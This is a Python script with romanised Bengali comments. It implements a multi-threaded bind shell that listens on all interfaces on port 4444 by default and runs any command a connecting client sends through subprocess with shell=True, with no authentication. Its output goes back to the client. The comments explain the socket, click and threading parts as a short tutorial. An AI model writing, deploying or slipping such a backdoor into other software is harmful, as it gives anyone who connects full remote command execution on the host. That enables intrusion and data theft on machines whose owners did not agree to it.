'''Ekhane amra aker odhik socket er satey connect lagaite parbo. ekhane subprocess module amader ke command execution e help korbe and socket amader ke
remote host er satey connectivity established e help korbe and click help kore amader ke terminal e argument nite along with flag sign. Lastly thread
amader socket e multiple connection handle korte sahajjo korbe'''

import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()


'''Intermediate knowledge requirement as ami full explanation e jabo nh. just main part gulo briefly explain korle: Python IDIOM diye amader main function
ke call kora hoise. Aita mendatory cz amra ekhane main function ke click er instance hisabe use korsi. Tai main function kokhonoi nije theke call hobe nh
untill amra explicitly call kortesi. jeta ekhane Python Idiom use kore. Then click theke asha input socket er bind port e pass kora hoise then socket listen
korar por j output generate korse tar first return niye amader concern tai next return argument ke placeholder diye ignor kora hoise. Tarpor theading e
handle_input function call kore sekhane socket theke pawa input deliver kora hoise. Evabe multiple threading kore multiple connection build up kora hoise'''